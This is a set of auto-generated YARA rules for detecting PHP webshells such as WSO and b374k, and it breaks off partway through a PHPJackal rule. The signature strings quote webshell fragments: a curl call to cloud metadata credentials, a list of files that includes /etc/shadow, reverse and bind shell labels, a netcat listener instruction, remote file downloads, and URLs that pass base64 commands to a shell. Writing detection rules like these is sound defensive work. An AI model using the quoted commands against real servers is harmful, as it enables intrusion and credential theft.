/*
   YARA Rule Set
   Author: yarGen Rule Generator
   Date: 2024-07-10
   Identifier: webshell
   Reference: https://github.com/Neo23x0/yarGen
*/

/* Rule Set ----------------------------------------------------------------- */

rule bypass403 {
   meta:
      description = "webshell - file bypass403.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "0f4ac0a10f5b4ee27fec5e85928fd45ef76d48b24bc6d822a5f68cdbe5c433b3"
   strings:
      $x1 = "<div class=\"form-group\"><label for=\"ctn\">Content :</label><textarea name=\"ctn\" id=\"ctn\" cols=\"30\" rows=\"10\" class=\"" ascii
      $x2 = "<html lang=\"en\"><head><link rel=\"icon\" type=\"image/png\" href=\"https://telegra.ph/file/5eff4384d348c68a7e978.png\"><meta n" ascii
      $s3 = ".hex(\"view\").\"&n={$_GET[\"n\"]}\") : a(\"file contents failed to change\")) : null); elseif ($a == \"view\"): ?>" fullword ascii
      $s4 = "ss=\"bg-black text-center mt-2\"><small></small></div><script src=\"//code.jquery.com/jquery-3.5.1.slim.min.js\"></script><scrip" ascii
      $s5 = "<?php ((isset($_POST[\"s\"])) ? ($fc[13]($p.'/'.nhx($_GET[\"n\"]), $_POST[\"ctn\"]) ? a(\"file contents changed successfully\", " ascii
      $s6 = "e:18px;margin-left:6px;list-style:none}a{color:#fff}</style><script src=\"//unpkg.com/sweetalert/dist/sweetalert.min.js\"></scri" ascii
      $s7 = "68746d6c7370656369616c6368617273" ascii /* hex encoded string 'htmlspecialchars' */
      $s8 = "707265675f73706c6974" ascii /* hex encoded string 'preg_split' */
      $s9 = "69735f7772697461626c65" ascii /* hex encoded string 'is_writable' */
      $s10 = "61727261795f64696666" ascii /* hex encoded string 'array_diff' */
      $s11 = "6d6b646972" ascii /* hex encoded string 'mkdir' */
      $s12 = "737472746f74696d65" ascii /* hex encoded string 'strtotime' */
      $s13 = "6368646972" ascii /* hex encoded string 'chdir' */
      $s14 = "66696c655f7075745f636f6e74656e7473" ascii /* hex encoded string 'file_put_contents' */
      $s15 = "<?php ((isset($_POST[\"s\"])) ? ($fc[13]($p.'/'.nhx($_GET[\"n\"]), $_POST[\"ctn\"]) ? a(\"file contents changed successfully\", " ascii
      $s16 = "66696c655f6765745f636f6e74656e7473" ascii /* hex encoded string 'file_get_contents' */
      $s17 = "7068705f756e616d65" ascii /* hex encoded string 'php_uname' */
      $s18 = "72656e616d65" ascii /* hex encoded string 'rename' */
      $s19 = "66696c6573697a65" ascii /* hex encoded string 'filesize' */
      $s20 = "69735f646972" ascii /* hex encoded string 'is_dir' */
   condition:
      uint16(0) == 0x3f3c and filesize < 40KB and
      1 of ($x*) and 4 of them
}

rule webshell_php_wso_ng {
   meta:
      description = "webshell - file wso-ng.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "7dd2dad4b336d3d76a3a9f43aba0a119dc13a95fd1572c5c92d4996916848fb8"
   strings:
      $x1 = "else $aliases = array(\"Fetch AWS metadata\" => \"curl -Ss http://169.254.169.254/latest/meta-data/identity-credentials/\", \"Li" ascii
      $x2 = "echo '<h1>Bruteforce</h1><div class=content><table><form method=post><tr><td><span>Type</span></td>' . '<td><select name=proto><" ascii
      $x3 = "$packet.= initializeParams(1, array(\"REQUEST_METHOD\" => \"GET\", \"SERVER_PROTOCOL\" => \"HTTP/1.1\", \"GATEWAY_INTERFACE\" =>" ascii
      $x4 = "return \"<label title='\".$headers.\"'>bypass failed: wrong target script: \".$test_file.\"</label>\";" fullword ascii
      $x5 = "if ($os == 'win') $aliases = array(\"List Directory\" => \"dir\", \"Find index.php in current dir\" => \"dir /s /w /b index.php" ascii
      $x6 = "Clipboard = function(){ var a;return{copy:function(b){a=document.createElement('textArea');a.value=b;document.body.appendChild(a" ascii
      $s7 = "<span>disk:</span> total ' . wsoViewSize($totalSpace) . ', free ' . wsoViewSize($freeSpace) . ' (' . (int)($freeSpace / $totalSp" ascii
      $s8 = "$str = \"host='\" . $ip . \"' port='\" . $port . \"' user='\" . $login . \"' password='\" . $pass . \"' dbname=postgres\";" fullword ascii
      $s9 = "c/cpuinfo') ? substr_count('' . @file_get_contents('/proc/cpuinfo'), \"processor\") : '--') . ', <span>loadavg:</span> ' . subst" ascii
      $s10 = "if ($db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base'])) {" fullword ascii
      $s11 = "$vt_detections = preg_replace('/^(.*\"response_code\": ?)(\\d+)(, ?\".*)|(.+\"positives\": )(\\d{1,2})(, \"total.+)$/', '$2$5', " ascii
      $s12 = "// https://antichat.com/threads/473143/#post-4353235" fullword ascii
      $s13 = "$downloaders = array('wget', 'fetch', 'lynx', 'links', 'curl', 'get', 'lwp-mirror');" fullword ascii
      $s14 = "emoveAllRanges();c.addRange(b);a.setSelectionRange(0,999999)}else a.select();document.execCommand('copy');document.body.removeCh" ascii
      $s15 = "$interesting = array(\"/etc/os-release\", \"/etc/passwd\", \"/etc/shadow\", \"/etc/group\", \"/etc/issue\", \"/etc/issue.net\", " ascii
      $s16 = " *config*.php in current dir\" => \"dir /s /w /b *config*.php\", \"Show active connections\" => \"netstat -an\", \"Show running " ascii
      $s17 = "$body = str_replace('/notexist' . $rand, $_SERVER['SCRIPT_NAME'], wsoGetFile('http://' . $_SERVER['HTTP_HOST'] . '/notexist' . $" ascii
      $s18 = "echo \"<input type='checkbox' onclick='is();'> <input type=button value='Dump' onclick='document.sf.p2.value=\\\"download\\\";do" ascii
      $s19 = "if (isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass)) WSOsetcookie(md5($_SERVER['HTTP_HOST']), $auth_pass);" fullword ascii
      $s20 = "$file_path = '/tmp/' . substr(md5($url), 0, 16) . substr(md5(@file_get_contents($_SERVER['SCRIPT_FILENAME'])), 16);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule webshell_php_upsi1on {
   meta:
      description = "webshell - file upsi1on.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "e89e326960c2e6558da08706867e7f2b6b738ef8fbb8ea1abc3bb4f13924cffd"
   strings:
      $s1 = "function confExec (quest, command) {" fullword ascii
      $s2 = "document.getElementById (\"shellOutput\").innerHTML = document.getElementById (\"shellOutput\").innerHTML + \"<br><span class='l" ascii
      $s3 = "$GLOBALS[45] (\"webshelLoginVerify\", $GLOBALS[44] ($_POST[\"password\"]));" fullword ascii
      $s4 = "document.getElementById (\"shellOutput\").innerHTML = document.getElementById (\"shellOutput\").innerHTML + \"<br><span class='l" ascii
      $s5 = "document.cookie = 'webshelLoginVerify=; expires=Thu, 01-Jan-70 00:00:01 GMT'" fullword ascii
      $s6 = "output = document.getElementById (\"shellOutput\")" fullword ascii
      $s7 = "6469736B5F746F74616C5F7370616365" ascii /* hex encoded string 'disk_total_space' */
      $s8 = "68746D6C7370656369616C6368617273" ascii /* hex encoded string 'htmlspecialchars' */
      $s9 = "6368646972" ascii /* hex encoded string 'chdir' */
      $s10 = "676574637764" ascii /* hex encoded string 'getcwd' */
      $s11 = "7374725F636F6E7461696E73" ascii /* hex encoded string 'str_contains' */
      $s12 = "7068705F756E616D65" ascii /* hex encoded string 'php_uname' */
      $s13 = "66696C656D74696D65" ascii /* hex encoded string 'filemtime' */
      $s14 = "6D6B646972" ascii /* hex encoded string 'mkdir' */
      $s15 = "61727261795F6D65726765" ascii /* hex encoded string 'array_merge' */
      $s16 = "737072696E7466" ascii /* hex encoded string 'sprintf' */
      $s17 = "70687076657273696F6E" ascii /* hex encoded string 'phpversion' */
      $s18 = "636C656172737461746361636865" ascii /* hex encoded string 'clearstatcache' */
      $s19 = "696E5F6172726179" ascii /* hex encoded string 'in_array' */
      $s20 = "706870696E666F" ascii /* hex encoded string 'phpinfo' */
   condition:
      uint16(0) == 0x3f3c and filesize < 70KB and
      8 of them
}

rule b374k_2_4 {
   meta:
      description = "webshell - file b374k-2.4.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "13102785319ab7591a39c8a8bb40b01bf34e49a7f0a832a1f3dbaabf5f40e9dd"
   strings:
      $s1 = "else echo \"- shell command -\";" fullword ascii
      $s2 = "if(buff.value == '- shell command -') buff.value = '';" fullword ascii
      $s3 = "$rsbind[\"bind_win\"] = \"Bind Shell <span style='font-size:12px;color:#999;'>- windows executable</span>\";" fullword ascii
      $s4 = "http://www.myserver.com/b374k.php?s_pass=0de664ecd2be02cdd54234a0d1229b43&cmd=dW5hbWUgLWE=" fullword ascii
      $s5 = "q99021Bibd8qdw4NBZ/7uXGFy1Pl+anH7XAc5Hn9V3mpCViltqOrEYeLOgruNToPnGfOa64UYq9SsS5xxEzXVXc1kr741dj3ysoQsdt7zqMhrCN/Y+NSHb3DD2Hfl2wS" ascii
      $s6 = "setcookie(\"b374k_included\", \"0\" ,time() - $s_login_time);" fullword ascii
      $s7 = "setcookie($k,\"\",time() - $s_login_time);" fullword ascii
      $s8 = "// give the code/command you want to execute in base64 format" fullword ascii
      $s9 = "elseif($split[0]==\"back\") $rstarget_packed = $rsport_.\" \".$rshost_;" fullword ascii
      $s10 = "$s_pass = \"0de664ecd2be02cdd54234a0d1229b43\"; // shell password, fill with password in md5 format to protect shell, default : " ascii
      $s11 = "$s_pass = \"0de664ecd2be02cdd54234a0d1229b43\"; // shell password, fill with password in md5 format to protect shell, default : " ascii
      $s12 = "http://www.myserver.com/b374k.php?s_pass=0de664ecd2be02cdd54234a0d1229b43&eval=cGhwaW5mbygpOw==" fullword ascii
      $s13 = "$rsback[\"back_win\"] = \"Reverse Shell <span style='font-size:12px;color:#999;'>- windows executable</span>\";" fullword ascii
      $s14 = "$rspesanb = \"Run &#39;  nc -l -v -p <i>port</i>  &#39; on your computer and press &#39;  Go !  &#39; button\";" fullword ascii
      $s15 = "$proc = @proc_open($c, $descriptorspec, $pipes, getcwd(), array());" fullword ascii
      $s16 = "// note that it will not works if shell password is empty ($s_pass);" fullword ascii
      $s17 = "// shell command" fullword ascii
      $s18 = "<?php if(isset($_REQUEST['login'])) echo \"if(d.getElementById('login')) d.getElementById('login').focus();\"; ?>" fullword ascii
      $s19 = "$dump_tbl_link = $s_self.\"db&connect=&sqlhost=\".$sqlhost.\"&sqlport=\".$sqlport.\"&sqluser=\".$sqluser.\"&sqlpass=\".$sqlpass." ascii
      $s20 = "if($split[0]==\"bind\") $rstarget_packed = $rsport_;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      8 of them
}

rule b374k_2_5_source {
   meta:
      description = "webshell - file b374k-2.5.source.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "2fa1659755f6cf2f5a5db59a7836e77e0a069218557fa552b9230b5e4da56469"
   strings:
      $s1 = "else echo \"- shell command -\";" fullword ascii
      $s2 = "if(buff.value == '- shell command -') buff.value = '';" fullword ascii
      $s3 = "Poq99021Bibd8qdw4NBZ/7uXGFy1Pl+anH7XAc5Hn9V3mpCViltqOrEYeLOgruNToPnGfOa64UYq9SsS5xxEzXVXc1kr741dj3ysoQsdt7zqMhrCN/Y+NSHb3DD2Hfl2" ascii
      $s4 = "http://www.myserver.com/b374k.php?s_pass=0de664ecd2be02cdd54234a0d1229b43&cmd=dW5hbWUgLWE=" fullword ascii
      $s5 = "$s_rsbind[\"bind_win\"] = \"Bind Shell <span style='font-size:12px;color:#999;'>- windows executable</span>\";" fullword ascii
      $s6 = "setcookie(\"b374k_included\", \"0\" ,time() - $s_login_time);" fullword ascii
      $s7 = "setcookie(\"massact\", \"\" ,time() - $s_login_time);" fullword ascii
      $s8 = "setcookie(\"buffer\", \"\" ,time() - $s_login_time);" fullword ascii
      $s9 = "setcookie($s_k,\"\",time() - $s_login_time);" fullword ascii
      $s10 = "elseif($s_split[0]==\"back\") $s_rstarget_packed = $s_rsport_.\" \".$s_rshost_;" fullword ascii
      $s11 = "// give the code/command you want to execute in base64 format" fullword ascii
      $s12 = "$s_pass = \"0de664ecd2be02cdd54234a0d1229b43\"; // shell password, fill with password in md5 format to protect shell, default : " ascii
      $s13 = "$s_pass = \"0de664ecd2be02cdd54234a0d1229b43\"; // shell password, fill with password in md5 format to protect shell, default : " ascii
      $s14 = "http://www.myserver.com/b374k.php?s_pass=0de664ecd2be02cdd54234a0d1229b43&eval=cGhwaW5mbygpOw==" fullword ascii
      $s15 = "$s_rspesanb = \"Run &#39;  nc -l -v -p <i>port</i>  &#39; on your computer and press &#39;  Go !  &#39; button\";" fullword ascii
      $s16 = "$s_proc = @proc_open($s_c, $s_descriptorspec, $s_pipes, getcwd(), array());" fullword ascii
      $s17 = "$s_rsback[\"back_win\"] = \"Reverse Shell <span style='font-size:12px;color:#999;'>- windows executable</span>\";" fullword ascii
      $s18 = "// note that it will not works if shell password is empty ($s_pass);" fullword ascii
      $s19 = "if($s_split[0]==\"bind\") $s_rstarget_packed = $s_rsport_;" fullword ascii
      $s20 = "// shell command" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      8 of them
}

rule b374k_2_6_source {
   meta:
      description = "webshell - file b374k-2.6.source.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "c14466232481a3aa9192507127f2ca43898228671e5e87a17ddd05383c758746"
   strings:
      $s1 = "else echo \"- shell command -\";" fullword ascii
      $s2 = "if(buff.value == '- shell command -') buff.value = '';" fullword ascii
      $s3 = "Poq99021Bibd8qdw4NBZ/7uXGFy1Pl+anH7XAc5Hn9V3mpCViltqOrEYeLOgruNToPnGfOa64UYq9SsS5xxEzXVXc1kr741dj3ysoQsdt7zqMhrCN/Y+NSHb3DD2Hfl2" ascii
      $s4 = "http://www.myserver.com/b374k.php?s_pass=0de664ecd2be02cdd54234a0d1229b43&cmd=dW5hbWUgLWE=" fullword ascii
      $s5 = "setcookie(\"b374k_included\", \"0\" ,time() - $s_login_time);" fullword ascii
      $s6 = "if(!in_array($s_k, $persist)) if(!is_array($s_k)) setcookie($s_k,\"\",time() - $s_login_time);" fullword ascii
      $s7 = "setcookie(\"massact\", \"\" ,time() - $s_login_time);" fullword ascii
      $s8 = "setcookie(\"buffer\", \"\" ,time() - $s_login_time);" fullword ascii
      $s9 = "setcookie(\"c[\".$k.\"]\", \"\" ,time() - $s_login_time);" fullword ascii
      $s10 = "elseif($s_split[0]==\"back\") $s_rstarget_packed = $s_rsport_.\" \".$s_rshost_;" fullword ascii
      $s11 = "// give the code/command you want to execute in base64 format" fullword ascii
      $s12 = "$s_pass = \"0de664ecd2be02cdd54234a0d1229b43\"; // shell password, fill with password in md5 format to protect shell, default : " ascii
      $s13 = "$s_pass = \"0de664ecd2be02cdd54234a0d1229b43\"; // shell password, fill with password in md5 format to protect shell, default : " ascii
      $s14 = "http://www.myserver.com/b374k.php?s_pass=0de664ecd2be02cdd54234a0d1229b43&eval=cGhwaW5mbygpOw==" fullword ascii
      $s15 = "$s_rspesanb = \"Run &#39;  nc -l -v -p <i>port</i>  &#39; on your computer and press &#39;  Go !  &#39; button\";" fullword ascii
      $s16 = "$s_proc = @proc_open($s_c, $s_descriptorspec, $s_pipes, getcwd(), array());" fullword ascii
      $s17 = "$s_rsbind[\"bind_win\"] = \"Bind Shell <span class='desc' style='font-size:12px;'>- windows executable</span>\";" fullword ascii
      $s18 = "// note that it will not works if shell password is empty ($s_pass);" fullword ascii
      $s19 = "if($s_split[0]==\"bind\") $s_rstarget_packed = $s_rsport_;" fullword ascii
      $s20 = "// shell command" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 400KB and
      8 of them
}

rule b374k_3_2_2 {
   meta:
      description = "webshell - file b374k-3.2.2.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "72c6af6a4be99e31c4a7a0aa4f01750792788e7f6f9749243a9f2c47c14a708f"
   strings:
      $x1 = "var Zepto=function(){function G(a){return a==null?String(a):z[A.call(a)]||\"object\"}function H(a){return G(a)==\"function\"}fun" ascii
      $s2 = "$cmd = trim(execute(\"ps -p \".$pid));" fullword ascii
      $s3 = "return (res = new RegExp('(?:^|; )' + encodeURIComponent(key) + '=([^;]*)').exec(document.cookie)) ? (res[1]) : null;" fullword ascii
      $s4 = "$cmd = execute(\"taskkill /F /PID \".$pid);" fullword ascii
      $s5 = "$buff = execute(\"wget \".$url.\" -O \".$saveas);" fullword ascii
      $s6 = "$buff = execute(\"curl \".$url.\" -o \".$saveas);" fullword ascii
      $s7 = "(d=\"0\"+d);dt2=y+m+d;return dt1==dt2?0:dt1<dt2?-1:1},r:function(a,b){for(var c=0,e=a.length-1,g=h;g;){for(var g=j,f=c;f<e;++f)0" ascii
      $s8 = "$cmd = execute(\"kill -9 \".$pid);" fullword ascii
      $s9 = "$cmd = execute(\"tasklist /FI \\\"PID eq \".$pid.\"\\\"\");" fullword ascii
      $s10 = "$body = preg_replace(\"/<a href=\\\"http:\\/\\/www.zend.com\\/(.*?)<\\/a>/\", \"\", $body);" fullword ascii
      $s11 = "execute(\"tar xf \\\"\".basename($archive).\"\\\" -C \\\"\".$target.\"\\\"\");" fullword ascii
      $s12 = "ngs.mimeType||xhr.getResponseHeader(\"content-type\")),result=xhr.responseText;try{dataType==\"script\"?(1,eval)(result):dataTyp" ascii
      $s13 = "execute(\"tar xzf \\\"\".basename($archive).\"\\\" -C \\\"\".$target.\"\\\"\");" fullword ascii
      $s14 = "src:url(data:application/x-font-woff;charset=utf-8;base64,d09GRgABAAAAAGkYAA8AAAAAp+gAAQABAAAAAAAAAAAAAAAAAAAAAAAAAABGRlRNAAABWA" ascii
      $s15 = "/* Zepto v1.1.2 - zepto event ajax form ie - zeptojs.com/license */" fullword ascii
      $s16 = "$check = strtolower(execute(\"ruby -h\"));" fullword ascii
      $s17 = "$check = strtolower(execute(\"java -help\"));" fullword ascii
      $s18 = "$check = strtolower(execute(\"python -h\"));" fullword ascii
      $s19 = "$buff = execute(\"lwp-download \".$url.\" \".$saveas);" fullword ascii
      $s20 = "$check = strtolower(execute(\"javac -help\"));" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 600KB and
      1 of ($x*) and 4 of them
}

rule b374k_2_3 {
   meta:
      description = "webshell - file b374k-2.3.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "e6b1fbcc9a2d988ef9e8c36da38f19a802a5886a43736a1466566f97f342f946"
   strings:
      $s1 = "else echo \"- shell command -\";" fullword ascii
      $s2 = "if(buff.value == '- shell command -') buff.value = '';" fullword ascii
      $s3 = "http://www.myserver.com/b374k.php?s_pass=0de664ecd2be02cdd54234a0d1229b43&cmd=dW5hbWUgLWE=" fullword ascii
      $s4 = "q99021Bibd8qdw4NBZ/7uXGFy1Pl+anH7XAc5Hn9V3mpCViltqOrEYeLOgruNToPnGfOa64UYq9SsS5xxEzXVXc1kr741dj3ysoQsdt7zqMhrCN/Y+NSHb3DD2Hfl2wS" ascii
      $s5 = "$rsbind[\"bind_win\"] = \"Bind Shell <span style=\\\"font-size:12px;color:#999;\\\">- windows executable</span>\";" fullword ascii
      $s6 = "elseif(isset($_REQUEST['pgsql']) && ($con = pg_connect(\"host=$sqlhost user=$sqluser password=$sqlpass port=$sqlport\"))){" fullword ascii
      $s7 = "// give the code/command you want to execute in base64 format" fullword ascii
      $s8 = "elseif($split[0]==\"back\") $rstarget_packed = $rsport_.\" \".$rshost_;" fullword ascii
      $s9 = "$s_pass = \"0de664ecd2be02cdd54234a0d1229b43\"; // shell password, fill with password in md5 format to protect shell, default : " ascii
      $s10 = "$s_pass = \"0de664ecd2be02cdd54234a0d1229b43\"; // shell password, fill with password in md5 format to protect shell, default : " ascii
      $s11 = "http://www.myserver.com/b374k.php?s_pass=0de664ecd2be02cdd54234a0d1229b43&eval=cGhwaW5mbygpOw==" fullword ascii
      $s12 = "$rspesanb = \"Run &#39;  nc -l -v -p <i>port</i>  &#39; on your computer and press &#39;  Go !  &#39; button\";" fullword ascii
      $s13 = "$proc = proc_open($c, $descriptorspec, $pipes, getcwd(), array());" fullword ascii
      $s14 = "$rsback[\"back_win\"] = \"Reverse Shell <span style=\\\"font-size:12px;color:#999;\\\">- windows executable</span>\";" fullword ascii
      $s15 = "// note that it will not works if shell password is empty ($s_pass);" fullword ascii
      $s16 = "// shell command" fullword ascii
      $s17 = "if($split[0]==\"bind\") $rstarget_packed = $rsport_;" fullword ascii
      $s18 = "header(\"Content-type: text/javascript\");" fullword ascii
      $s19 = "} // bind and reverse shell" fullword ascii
      $s20 = "// bind and reverse shell" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      8 of them
}

rule b374k_3_2_3 {
   meta:
      description = "webshell - file b374k-3.2.3.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "53fe44b4753874f079a936325d1fdc9b1691956a29c3aaf8643cdbd49f5984bf"
   strings:
      $x1 = "var Zepto=function(){function G(a){return a==null?String(a):z[A.call(a)]||\"object\"}function H(a){return G(a)==\"function\"}fun" ascii
      $s2 = "$cmd = trim(execute(\"ps -p \".$pid));" fullword ascii
      $s3 = "return (res = new RegExp('(?:^|; )' + encodeURIComponent(key) + '=([^;]*)').exec(document.cookie)) ? (res[1]) : null;" fullword ascii
      $s4 = "$cmd = execute(\"taskkill /F /PID \".$pid);" fullword ascii
      $s5 = "$buff = execute(\"wget \".$url.\" -O \".$saveas);" fullword ascii
      $s6 = "$buff = execute(\"curl \".$url.\" -o \".$saveas);" fullword ascii
      $s7 = "(d=\"0\"+d);dt2=y+m+d;return dt1==dt2?0:dt1<dt2?-1:1},r:function(a,b){for(var c=0,e=a.length-1,g=h;g;){for(var g=j,f=c;f<e;++f)0" ascii
      $s8 = "$cmd = execute(\"kill -9 \".$pid);" fullword ascii
      $s9 = "$cmd = execute(\"tasklist /FI \\\"PID eq \".$pid.\"\\\"\");" fullword ascii
      $s10 = "$body = preg_replace(\"/<a href=\\\"http:\\/\\/www.zend.com\\/(.*?)<\\/a>/\", \"\", $body);" fullword ascii
      $s11 = "execute(\"tar xf \\\"\".basename($archive).\"\\\" -C \\\"\".$target.\"\\\"\");" fullword ascii
      $s12 = "ngs.mimeType||xhr.getResponseHeader(\"content-type\")),result=xhr.responseText;try{dataType==\"script\"?(1,eval)(result):dataTyp" ascii
      $s13 = "execute(\"tar xzf \\\"\".basename($archive).\"\\\" -C \\\"\".$target.\"\\\"\");" fullword ascii
      $s14 = "src:url(data:application/x-font-woff;charset=utf-8;base64,d09GRgABAAAAAGkYAA8AAAAAp+gAAQABAAAAAAAAAAAAAAAAAAAAAAAAAABGRlRNAAABWA" ascii
      $s15 = "/* Zepto v1.1.2 - zepto event ajax form ie - zeptojs.com/license */" fullword ascii
      $s16 = "$check = strtolower(execute(\"ruby -h\"));" fullword ascii
      $s17 = "$check = strtolower(execute(\"java -help\"));" fullword ascii
      $s18 = "$check = strtolower(execute(\"python -h\"));" fullword ascii
      $s19 = "$buff = execute(\"lwp-download \".$url.\" \".$saveas);" fullword ascii
      $s20 = "$check = strtolower(execute(\"javac -help\"));" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 700KB and
      1 of ($x*) and 4 of them
}

rule b374k_2_7_source {
   meta:
      description = "webshell - file b374k-2.7.source.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "d31034d5e4fd8d5d8efe640c4d2aa7ac43c71989f84fb4e92606a18563b3fd5e"
   strings:
      $s1 = "// https://github.com/ded/domready - domready (c) Dustin Diaz" fullword ascii
      $s2 = "else echo \"- shell command -\";" fullword ascii
      $s3 = "if(buff.value == '- shell command -') buff.value = '';" fullword ascii
      $s4 = "Poq99021Bibd8qdw4NBZ/7uXGFy1Pl+anH7XAc5Hn9V3mpCViltqOrEYeLOgruNToPnGfOa64UYq9SsS5xxEzXVXc1kr741dj3ysoQsdt7zqMhrCN/Y+NSHb3DD2Hfl2" ascii
      $s5 = "http://www.myserver.com/b374k.php?s_pass=0de664ecd2be02cdd54234a0d1229b43&cmd=dW5hbWUgLWE=" fullword ascii
      $s6 = "if(trim($s_res)=='') $s_result = notif(\"Error getting process list\");" fullword ascii
      $s7 = "setcookie(\"b374k_included\", \"0\" ,time() - $s_login_time);" fullword ascii
      $s8 = "if(!in_array($s_k, $persist)) if(!is_array($s_k)) setcookie($s_k,\"\",time() - $s_login_time);" fullword ascii
      $s9 = "setcookie(\"massact\", \"\" ,time() - $s_login_time);" fullword ascii
      $s10 = "setcookie(\"buffer\", \"\" ,time() - $s_login_time);" fullword ascii
      $s11 = "setcookie(\"c[\".$k.\"]\", \"\" ,time() - $s_login_time);" fullword ascii
      $s12 = "elseif($s_split[0]==\"back\") $s_rstarget_packed = $s_rsport_.\" \".$s_rshost_;" fullword ascii
      $s13 = "// give the code/command you want to execute in base64 format" fullword ascii
      $s14 = "$s_pass = \"0de664ecd2be02cdd54234a0d1229b43\"; // shell password, fill with password in md5 format to protect shell, default : " ascii
      $s15 = "$s_pass = \"0de664ecd2be02cdd54234a0d1229b43\"; // shell password, fill with password in md5 format to protect shell, default : " ascii
      $s16 = "http://www.myserver.com/b374k.php?s_pass=0de664ecd2be02cdd54234a0d1229b43&eval=cGhwaW5mbygpOw==" fullword ascii
      $s17 = "$s_rspesanb = \"Run &#39;  nc -l -v -p <i>port</i>  &#39; on your computer and press &#39;  Go !  &#39; button\";" fullword ascii
      $s18 = "$s_proc = @proc_open($s_c, $s_descriptorspec, $s_pipes, getcwd(), array());" fullword ascii
      $s19 = "$s_rsbind[\"bind_win\"] = \"Bind Shell <span class='desc' style='font-size:12px;'>- windows executable</span>\";" fullword ascii
      $s20 = "// note that it will not works if shell password is empty ($s_pass);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 400KB and
      8 of them
}

rule webshell_php__v {
   meta:
      description = "webshell - file .v.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3628cc351602552e975ead1af85af7a20e1e06714f5aaada34d050c559ac4c70"
   strings:
      $x1 = " '<td><nobr>'.substr(@php_uname(), 0, 120).' <a href=\"https://nullrefer.com/?https://www.google.com/search?q='.urlencode(@php_u" ascii
      $s2 = "<!-- particles --> <div id='particles-js'></div><script src='https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js'></scr" ascii
      $s3 = "<!-- particles --> <div id='particles-js'></div><script src='https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js'></scr" ascii
      $s4 = "$explink = 'http://nullrefer.com/?https://www.exploit-db.com/search/?action=search&description=';" fullword ascii
      $s5 = "if(isset($_POST['p3'])) $_POST['p3'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['p3'],$_COOKIE[md5($_SERVER['HTTP_HOST" ascii
      $s6 = "if(isset($_POST['p1'])) $_POST['p1'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['p1'],$_COOKIE[md5($_SERVER['HTTP_HOST" ascii
      $s7 = "if(isset($_POST['p2'])) $_POST['p2'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['p2'],$_COOKIE[md5($_SERVER['HTTP_HOST" ascii
      $s8 = "if(isset($_POST['a'])) $_POST['a'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['a'],$_COOKIE[md5($_SERVER['HTTP_HOST'])" ascii
      $s9 = "if(isset($_POST['c'])) $_POST['c'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['c'],$_COOKIE[md5($_SERVER['HTTP_HOST'])" ascii
      $s10 = "d.mf.p3.value = encrypt(d.mf.p3.value,'\".$_COOKIE[md5($_SERVER['HTTP_HOST']).\"key\"].\"');" fullword ascii
      $s11 = "echo \"<input type='checkbox' onclick='is();'> <input type=submit value='Dump' onclick='document.sf.p2.value=\\\"download\\\";do" ascii
      $s12 = "d.mf.a.value = encrypt(d.mf.a.value,'\".$_COOKIE[md5($_SERVER['HTTP_HOST']).\"key\"].\"');" fullword ascii
      $s13 = "d.mf.c.value = encrypt(d.mf.c.value,'\".$_COOKIE[md5($_SERVER['HTTP_HOST']).\"key\"].\"');" fullword ascii
      $s14 = "d.mf.p1.value = encrypt(d.mf.p1.value,'\".$_COOKIE[md5($_SERVER['HTTP_HOST']).\"key\"].\"');" fullword ascii
      $s15 = "d.mf.p2.value = encrypt(d.mf.p2.value,'\".$_COOKIE[md5($_SERVER['HTTP_HOST']).\"key\"].\"');" fullword ascii
      $s16 = "$m = array('View', 'Highlight', 'Download', 'Hexdump', 'Edit', 'Chmod', 'Rename', 'Touch', 'Frame');" fullword ascii
      $s17 = "if( bruteForce($server[0],@$server[1], $_POST['login'], $line) ) {" fullword ascii
      $s18 = " Unable to execute command\\n\";" fullword ascii
      $s19 = "if(isset($_POST['p2'])) $_POST['p2'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['p2'],$_COOKIE[md5($_SERVER['HTTP_HOST" ascii
      $s20 = "if(isset($_POST['a'])) $_POST['a'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['a'],$_COOKIE[md5($_SERVER['HTTP_HOST'])" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule PHPJackal_v1_5 {
   meta:
      description = "webshell - file PHPJackal v1.5.php"
